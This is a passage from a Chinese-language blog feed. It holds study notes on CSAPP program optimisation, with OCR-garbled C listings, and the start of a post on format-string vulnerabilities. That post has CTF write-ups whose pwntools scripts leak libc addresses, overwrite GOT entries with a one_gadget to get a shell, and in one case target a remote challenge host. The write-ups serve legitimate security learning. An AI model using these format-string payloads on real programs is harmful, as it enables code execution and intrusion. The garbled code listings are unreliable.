href="#理解现代处理器" class="headerlink" title="理解现代处理器"></a>理解现代处理器</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li>指令集并行：同时对多条指令进行求值</li><li>延迟界限 (latency bound)：当一系列操作必须按照严格顺序执行时，就会遇到延迟界限 (latencybound), 因为在下一条指令开始之前，这条指令必须结束。</li><li>吞吐量界限 (throughput bound) ：刻画了处理器功能单元的原始计算能力。这个界限是程序性能的终极限制。</li></ul><h4 id="整体操作"><a href="#整体操作" class="headerlink" title="整体操作"></a>整体操作</h4><blockquote><p>我们假想的处理器设计是不太严格地基千近期的 Intel 处理器的结构。</p><ul><li>超标量 (superscalar) , 意思是它可以在每个时钟周期执行多个操作，</li><li>乱序的 (out of order) , 意思就是指令执行的顺序不 定要与它们在机器级程序中的顺序一致。</li></ul><p>整个设计有两个主要部分：</p><ul><li><p>指令控制单元 (Instruction Control Unit, ICU) ：负责从内存中读出指令序列，并根据这些指令序列生成一组针对程序数据的基本操作</p></li><li><p>执行单元 (Execution Unit, EU)：后者执行这些操作。</p></li></ul></blockquote><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129195314824.png" alt="image-20240129195314824"></p><ul><li><p>ICU 从指令高速缓存 (instruction cache) 中读取指令，指令高速缓存是一个特殊的高速存储器，它包含最近访问的指令。通常， ICU 会在当前正在执行的指令很早之前取指，这样它才有足够的时间对指令译码，并把操作发送到 EU 。  </p></li><li><p><code>分支预测 (branch prediction)</code>，处理器会猜测是否会选择分支，同时还预测分支的目标地址。使用投机执行 <code>(speculative execution)</code>的技术，处理器会开始取出位千它预测的分支会跳到的地方的指令，并对指令译码，甚至在它确定分支预测是否正确之前就开始执行这些操作。如果过后确定分支预测错误，会将状态重新设置到分支点的状态，并开始取出和执行另一个方向上的指令。标记为取指控制的块包括分支预测，以完成确定取哪些指令的任务。</p></li></ul><ul><li><p>ICU 中，<code>退役单元 (retirement unit)</code>记录正在进行的处理，并确保它遵守机器级程序的顺序语义。</p></li><li><p><code>寄存器重命名 (register renaming)</code>：控制操作数在执行单元间传送的最常见的机制称为寄存器重命名 (register renaming) 。当一条更新寄存器 的指令译码时，产生标记 t, 得到一个指向该操作结果的唯一的标识符。条目 (r, t) 被加入到一张表中，该表维护着每个程序寄存器 与会更新该寄存器的操作的标之间的关联。当随后以寄存器 作为操作数的指令译码时，发送到执行单元的操作会包作为操作数源的值。当某个执行单元完成第一个操作时，生成一个结果 (v, t)’ 指明标记为 的操作产生值 。所有等待 作为源的操作都能使用 作为源值，这就是一种形式的数据转发。通过这种机制，值可以从一个操作直接转发到另一个操作，而不是写到寄存器文件再读出来，使得第二个操作能够在第一个操作完成后尽快开始。重命名表只包含关于有未进行写操作的寄存器条目 当一条被译码的指令需要寄存器 r, 而又没有标记与这个寄存器相关联，那么可以直接从寄存器文件中获取这个操作数。有了寄存器重命名，即使只有在处理器确定了分支结果之后才能更新寄存器，也可以预测着执行操作的整个序列。</p></li></ul><h4 id="功能单元的性能"><a href="#功能单元的性能" class="headerlink" title="功能单元的性能"></a>功能单元的性能</h4><ul><li>一个是延迟 (latency), 它表示完成运算所需要的总时间；</li><li>另一个是发射时间 (issue time), 它表示两个连续的同类型的运算之间需要的最小时钟周期数；</li><li>还有一个是容量 (capacity), 它表示能够执行该运算的功能单元的数量。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129201151111.png" alt="image-20240129201151111"></p><ul><li>流水线化的功能单元实现为一系列的阶段(stage) , 每个阶段完成一部分的运算。发射时间为1的功能单元被称为<code>完全流水线化的 (fully pipelined)</code> : 每个时钟周期可以开始一个新的运算。</li><li>除法器（用于整数和浮点除法，还用来计算浮点平方根）不是完全流水线化的—— 它的发射时间等于它的延迟。这就意味着在开始 条新运算之前，除法器必须完成整个除法。我们还看到，对千除法的延迟和发射时间是以范围的形式给出的，因为某些被除数和除数的组合比其他的组合需要更多的步骤。除法的长延迟和长发射时间使之成为了一个相对开销很大的运算。</li><li><code>最大吞吐量</code>：表达发射时间的一种更常见的方法是指明这个功能单元的最大吞吐量，定义为发射时间的倒数。一个完全流水线化的功能单元有最大的吞吐量，每个时钟周期一个运算，而发射时间较大的功能单元的最大吞吐量比较小。具有多个功能单元可以进一步提高吞吐量。对一个容量为 C, 发射时间为 I的操作来说，处理器可能获得的吞吐量为每时钟周期 C/I个操作。比如，我们的参考机可以每个时钟周期执行两个浮点乘法运算 我们将看到如何利用这种能力来提高程序的性能。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129202924615.png" alt="image-20240129202924615"></p><ul><li><p><code>延迟界限</code>给出了任何必须按照严格顺序完成合并运算的函数所需要的最小 CPE 值。</p></li><li><p>根据功能单元产生结果的最大速率，<code>吞吐量界限</code>给出了 CPE 的最小界限。</p></li></ul><h4 id="处理器操作的抽象模型"><a href="#处理器操作的抽象模型" class="headerlink" title="处理器操作的抽象模型"></a>处理器操作的抽象模型</h4><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129203330641.png" alt="image-20240129203330641"></p><ul><li>只读：这些寄存器只用作源值，可以作为数据，也可以用来计算内存地址，但是在循环中它们是不会被修改的。循环 combine4 的只读寄存器是 rax</li><li>只写：这些寄存器作为数据传送操作的目的。在本循环中没有这样的寄存器。</li><li>局部：这些寄存器在循环内部被修改和使用，迭代与迭代之间不相关。在这个循环中，条件码寄存器就是例子： crnp 操作会修改它们，然后 jne 操作会使用它们，不过这种相关是在单次迭代之内的。</li><li>循环：对于循环来说，这些寄存器既作为源值，又作为目的，一次迭代中产生的值会在另一次迭代中用到。可以看到， %rdx %xmm0 combine4 的循环寄存器，对应千程序</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129203350562.png" alt="image-20240129203350562"></p><p><code>循环寄存器</code>之间的操作链决定了限制性能的数据相关</p><blockquote><p><code>关键路径 (critical path)</code>, 这是执行一组机器指令所需时钟周期数的一个下界。</p></blockquote><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129203859772.png" alt="image-20240129203859772"></p><h3 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h3><p>循环展开是一种程序变换，通过增加每次迭代计算的元素的数量，减少循环的迭代次数。  </p><p>把这个思想归纳为对一个循环按任意因子k进行展开，由此产生 k*l 循环展开。</p><p>循环展开能够从两个方面改进程序的性能。</p><ul><li><p>首先，它减少了不直接有助于程序结果的操作的数量，例如循环索引计算和条件分支。</p></li><li><p>第二，它提供了一些方法，可以进一步变化代码，减少整个计算中关键路径上的操作数量。</p></li></ul><h4 id="combine5"><a href="#combine5" class="headerlink" title="combine5"></a>combine5</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> I* <span class="number">2</span> x <span class="number">1</span> loop unrolling *I </span><br><span class="line"><span class="number">2</span> <span class="type">void</span> <span class="title function_">combine5</span><span class="params">(vec_ptr v, <span class="type">data_t</span> *dest)</span> </span><br><span class="line">3 &#123; </span><br><span class="line"><span class="number">4</span> <span class="type">long</span> i; </span><br><span class="line"><span class="number">5</span> <span class="type">long</span> length= vec_length(v); </span><br><span class="line"><span class="number">6</span> <span class="type">long</span> limit = length<span class="number">-1</span> ; </span><br><span class="line"><span class="number">7</span> <span class="type">data_t</span> *data = get_vec_start(v); </span><br><span class="line"><span class="number">8</span> data_ t ace = !DENT; </span><br><span class="line"><span class="number">9</span> </span><br><span class="line"><span class="number">10</span> I* Combine <span class="number">2</span> elements at a time *I </span><br><span class="line"><span class="number">11</span> <span class="keyword">for</span> (i = O; i &lt; limit; i+=<span class="number">2</span>) &#123; </span><br><span class="line"><span class="number">12</span> ace = (ace OP data [i]) OP data [i +<span class="number">1</span>] ; </span><br><span class="line"><span class="number">13</span> &#125; </span><br><span class="line"><span class="number">14</span> </span><br><span class="line"><span class="number">15</span> I* Finish any remaining elements *I </span><br><span class="line"><span class="number">16</span> <span class="keyword">for</span> (; i &lt; length; i++) &#123; </span><br><span class="line"><span class="number">1</span> <span class="number">7</span> ace = ace OP data [i] ; </span><br><span class="line"><span class="number">18</span> &#125; </span><br><span class="line"><span class="number">19</span> *dest = ace; </span><br><span class="line"><span class="number">20</span> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129205804438.png" alt="image-20240129205804438"></p><p>我们看到对于<code>整数加法</code>， CPE 有所改进，得到的延迟界限为 1. 00 会有这样的结果。是得益于减少 循环开销操作 相对于计算向 和所需要的加法数 ，降低开销操作的数。此时， 整数加法的一个周期的延迟成为了限制性能的因素 。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129210142245.png" alt="image-20240129210142245"></p><p>但是对于</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129210746839.png" alt="image-20240129210746839">    </p><blockquote><p>用优化等级3或更高等级调用 GCC, 它就会执行循环展开。</p></blockquote><h3 id="多个累计变量"><a href="#多个累计变量" class="headerlink" title="多个累计变量"></a>多个累计变量</h3><h4 id="combine6"><a href="#combine6" class="headerlink" title="combine6"></a>combine6</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/• <span class="number">2</span> x <span class="number">2</span> loop unrolling•/ </span><br><span class="line"><span class="type">void</span> <span class="title function_">combine6</span><span class="params">(vec_ptr v, <span class="type">data_t</span>•dest)</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="type">long</span> i; </span><br><span class="line"><span class="type">long</span> length= vec_length(v); </span><br><span class="line"><span class="type">long</span> limit = length<span class="number">-1</span>; </span><br><span class="line"><span class="type">data_t</span>•data= get_vec_start(v); </span><br><span class="line">data_ t accO = !DENT; </span><br><span class="line"><span class="type">data_t</span> acc1 = !DENT; </span><br><span class="line">I* Combine <span class="number">2</span> elements at a time *I </span><br><span class="line"><span class="title function_">for</span> <span class="params">(i = O; i &lt; limit; i+=<span class="number">2</span>)</span> &#123; </span><br><span class="line">accO = accO OP data[i]; </span><br><span class="line">acc1 = acc1 OP data[i+<span class="number">1</span>]; </span><br><span class="line">&#125; </span><br><span class="line">I* Finish any remaining elements *I </span><br><span class="line"><span class="title function_">for</span> <span class="params">(; i &lt; length; i++)</span> &#123; </span><br><span class="line">accO = accO OP data[i]; </span><br><span class="line">&#125; </span><br><span class="line">*dest = accO OP accl; &#125; </span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129211453412.png" alt="image-20240129211453412"></p><p>可以看到我们成功突破了延迟界限，处理器不再需要延迟一个加法或乘法操作以待前一个操作完成。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240129211149987.png" alt="image-20240129211149987"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240130162738937.png" alt="image-20240130162738937"></p><h3 id="重新结合变换"><a href="#重新结合变换" class="headerlink" title="重新结合变换"></a>重新结合变换</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">I* <span class="number">2</span> x <span class="number">1</span>a loop unrolling *I </span><br><span class="line"><span class="number">2</span> <span class="type">void</span> <span class="title function_">combine7</span><span class="params">(vec_ptr v, <span class="type">data_t</span> *dest)</span> </span><br><span class="line">3 &#123; </span><br><span class="line"><span class="number">4</span> <span class="type">long</span> i; </span><br><span class="line"><span class="number">5</span> <span class="type">long</span> length= vec_length(v); </span><br><span class="line"><span class="number">6</span> <span class="type">long</span> limit= length<span class="number">-1</span>; </span><br><span class="line"><span class="number">7</span> <span class="type">data_t</span> *data = get_vec_start(v); </span><br><span class="line"><span class="number">8</span> <span class="type">data_t</span> ace = !DENT; </span><br><span class="line"><span class="number">9</span> </span><br><span class="line"><span class="number">10</span> I* Combine <span class="number">2</span> elements at a time *I </span><br><span class="line"><span class="number">11</span> <span class="keyword">for</span> (i = O; i &lt; limit; i+=<span class="number">2</span>) &#123; </span><br><span class="line"><span class="number">12</span> ace = ace OP (data [i] OP data [i +<span class="number">1</span>]) ; </span><br><span class="line"><span class="number">13</span> &#125; </span><br><span class="line"><span class="number">14</span> </span><br><span class="line"><span class="number">15</span> I* Finish any remaining elements *I </span><br><span class="line"><span class="number">16</span> <span class="keyword">for</span> (; i &lt; length; i++) &#123; </span><br><span class="line"><span class="number">1</span> <span class="number">7</span> ace = ace OP data [i] ; </span><br><span class="line"><span class="number">18</span> &#125; </span><br><span class="line"><span class="number">19</span> *dest = ace· </span><br><span class="line"><span class="number">20</span> &#125; </span><br></pre></td></tr></table></figure><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240130163338794.png" alt="image-20240130163338794"></p><p>总的来说，重新结合变换能够减少计算中关键路径上操作的数量，通过更好地利用功能单元的流水线能 得到更好的性能。大多数编译器不会尝试对浮点运算做重新结合，因为这些运算不保证是 结合的。</p><blockquote><p>AVX 向量寄存器数据既可以是整数也可以是浮点数。 AVX 指令可以对这些寄存器执行向量操作，比如并行执行 多组数值的加法或乘法。<img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240130163852542.png" alt="image-20240130163852542"></p></blockquote><h3 id="一些限制因素"><a href="#一些限制因素" class="headerlink" title="一些限制因素"></a>一些限制因素</h3><h4 id="寄存器溢出"><a href="#寄存器溢出" class="headerlink" title="寄存器溢出"></a>寄存器溢出</h4><p>如果我们的并行度 超过了可用的寄存器数量，那么编译器会诉诸溢出 (spilling), 将某些临时值存放到内存中，通常是在运行时堆栈上分配空间。</p><p>一旦编译器必须要诉诸寄存器溢出，那么维护多个累积变量的优势就很可能消失。</p><h4 id="分支预测和预测错误处罚"><a href="#分支预测和预测错误处罚" class="headerlink" title="分支预测和预测错误处罚"></a>分支预测和预测错误处罚</h4><ul><li><p>不要过分关心预测的分支</p></li><li><p>书写适合用条件传送实现的代码</p></li></ul><p>功能式风格</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240130170509521.png" alt="image-20240130170509521"></p><blockquote><p>练习题5.9</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240130171252068.png" alt="image-20240130171252068"></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240130171333580.png" alt="image-20240130171333580"></p></blockquote><h3 id="理解内存性能"><a href="#理解内存性能" class="headerlink" title="理解内存性能"></a>理解内存性能</h3><h4 id="加载的性能"><a href="#加载的性能" class="headerlink" title="加载的性能"></a>加载的性能</h4><p>一个包含加载操作的程序的性能既依赖于流水线的能力，也依赖于加载单元的延迟。</p><h4 id="存储的性能"><a href="#存储的性能" class="headerlink" title="存储的性能"></a>存储的性能</h4><p>对于寄存器操作，在指令被译码成操作的时候，处理器就可以确定哪些指令会 他哪 指令。另一方面，对于内存<br>作，只有到计算出加 储的地址被计算出来以 ，处理器才能确定哪些指令会影响他的哪些。</p><h3 id="应用：-性能提高技术"><a href="#应用：-性能提高技术" class="headerlink" title="应用： 性能提高技术"></a>应用： 性能提高技术</h3><blockquote><p>1) 高级设计。为遇到的问题选择适当的算法和数据结构。要特别警觉，避免使用那些会渐进地产生糟糕性能的算法或编码技术。<br>2) 基本编码原则。避免限制优化的因素，这样编译器就能产生高效的代码。<br>• 消除连续的函数调用。在可能时，将计算移到循环外。考虑有选择地妥协程序的模块性以获得更大的效率<br>• 消除不必要的内存引用。引入临时变量来保存中间结果 只有在最后的值计算出来时，才将结果存放到数组或全局变量中<br>3) 低级优化。结构化代码以利用硬件功能。<br>• 展开循环，降低开销，并且使得进一步的优化成为可能。通过使用例如多个累积变址和重新结合等技术，找到方法提高指令级并行。<br>• 用功能性的风格重写条件操作，使得编译采用条件数据传送。</p></blockquote><h3 id="确认和消除性能瓶颈"><a href="#确认和消除性能瓶颈" class="headerlink" title="确认和消除性能瓶颈"></a>确认和消除性能瓶颈</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240130172517065.png" alt="image-20240130172517065"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这个编译器明明很强却过分谨慎。了解到编译器是如何优化程序的，我们也就要写出编译器能识别并优化程序的代码。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> book </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串</title>
      <link href="/2024/01/23/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2024/01/23/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h3 id="C语言变参函数"><a href="#C语言变参函数" class="headerlink" title="C语言变参函数"></a>C语言变参函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man <span class="number">3</span> <span class="built_in">printf</span> <span class="comment">//查看C语言格式化字符串</span></span><br></pre></td></tr></table></figure><p><img src="../../img/image-20231218210257030.png" alt="image-20231218210257030"></p><p><img src="../../img/image-20231218211413717.png" alt="image-20231218211413717"></p><p>格式化字符串</p><h4 id="第n个参数"><a href="#第n个参数" class="headerlink" title="$第n个参数"></a>$第n个参数</h4><h4 id="s变量所对应地址的内容"><a href="#s变量所对应地址的内容" class="headerlink" title="%s变量所对应地址的内容"></a>%s变量所对应地址的内容</h4><h4 id="p获取对应栈的内存"><a href="#p获取对应栈的内存" class="headerlink" title="%p获取对应栈的内存"></a>%p获取对应栈的内存</h4><h4 id="n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。"><a href="#n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。" class="headerlink" title="%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。"></a>%<strong>n</strong>不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</h4><p>hn(half int)</p><p>hhn(half half int)</p><p>1.找到偏移值</p><p>通过fmtarg 来判断某个参数的偏移。</p><p>2.任意地址写入</p><p>3.</p><blockquote><p>-&gt;RELRO-&gt;got表项-&gt;一般改printf函数</p><p>栈</p><p>one_gadget</p><p>malloc_hook:printf参数超过 %43$p —&gt;调用 malloc</p><p>iofile</p></blockquote><h3 id="jarvisoj-fm1"><a href="#jarvisoj-fm1" class="headerlink" title="jarvisoj_fm1"></a>jarvisoj_fm1</h3><p>关闭PIE，我们可以直接将x的地址写入后用%n修改所指的变量。buf为栈上第11个参数</p><p><img src="../../img/image-20240123180037639.png" alt="image-20240123180037639"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,25242)</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line">x_addr=<span class="number">0x0804a02c</span></span><br><span class="line">payload=p32(x_addr)+<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80485AD&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../../img/image-20240123180524605.png" alt="image-20240123180524605"></p><h3 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h3><p><img src="../../img/image-20240123184845746.png" alt="image-20240123184845746"></p><p>翻译。他是一个复读机（-_-），32位程序,未开启PIE保护和canary保护。显然，放在此专题里，这是一个格式化字符串漏洞</p><p>sprintf</p><p><img src="../../img/image-20240123191903781.png" alt="image-20240123191903781"></p><p>注意到有<code>memset</code>函数，将栈上空间们置0，因此可以使用<code>one_gadget</code>。</p><p><img src="../../img/image-20240123225846468.png" alt="image-20240123225846468"></p><p><img src="../../img/image-20240123235720376.png" alt="image-20240123235720376"></p><p><strong>FmtStr</strong>(<em>execute_fmt</em>, <em>offset=None</em>, <em>padlen=0</em>, <em>numbwritten=0</em>)</p><p><img src="../../img/image-20240123231458996.png" alt="image-20240123231458996"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./axb_2019_fmt32&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29375</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/randolfluo/Desktop/libc/ubuntu16/libc-2.23_x86.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;axb_2019_fmt32&#x27;</span>)</span><br><span class="line">got_addr=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>+p32(got_addr)+<span class="string">b&#x27;114514&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span> <span class="comment">#a对齐got_addr。</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x80486FB&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;Please tell me:&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;114514&#x27;</span>)   <span class="comment">#定位read_real_addr</span></span><br><span class="line">read_real_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read:&quot;</span>+<span class="built_in">hex</span>(read_real_addr))</span><br><span class="line">libc_base=read_real_addr-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x3a819</span></span><br><span class="line">payload1= <span class="string">b&#x27;a&#x27;</span>+fmtstr_payload(<span class="number">8</span>,&#123;got_addr:one_gadget&#125;,write_size = <span class="string">&quot;byte&quot;</span>,numbwritten = <span class="number">0xa</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;me:&#x27;</span>,payload1)</span><br><span class="line">p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  int result; // eax</span><br><span class="line">  int fd; // [esp+0h] [ebp-84h]</span><br><span class="line">  char nptr[16]; // [esp+4h] [ebp-80h] BYREF</span><br><span class="line">  char buf[100]; // [esp+14h] [ebp-70h] BYREF</span><br><span class="line">  unsigned int v6; // [esp+78h] [ebp-Ch]</span><br><span class="line">  int *v7; // [esp+7Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  v1 = time(0);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;dword_804C044, 4u);</span><br><span class="line">  printf(&quot;your name:&quot;);</span><br><span class="line">  read(0, buf, 0x63u);</span><br><span class="line">  printf(&quot;Hello,&quot;);</span><br><span class="line">  printf(buf);</span><br><span class="line">  printf(&quot;your passwd:&quot;);</span><br><span class="line">  read(0, nptr, 0xFu);</span><br><span class="line">  if ( atoi(nptr) == dword_804C044 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ok!!&quot;);</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;fail&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  result = 0;</span><br><span class="line">  if ( __readgsdword(0x14u) != v6 )</span><br><span class="line">    sub_80493D0();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先随机生成4位passwd，然后输入用户名密码，如果密码正确，则调用system函数。我们可以从题目中的<code>printf(buf);</code>中看到格式化字符串漏洞。我们可以确定两点。</p><ul><li><p>有格式化字符串漏洞</p></li><li><p>有system函数地址</p></li></ul><h4 id="0x1：修改dword-804C044的值"><a href="#0x1：修改dword-804C044的值" class="headerlink" title="0x1：修改dword_804C044的值"></a>0x1：修改dword_804C044的值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./space5&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;bss_addr:<span class="number">0x1234</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name:&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your passwd&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1234</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x2：修改函数地址为system地址"><a href="#0x2：修改函数地址为system地址" class="headerlink" 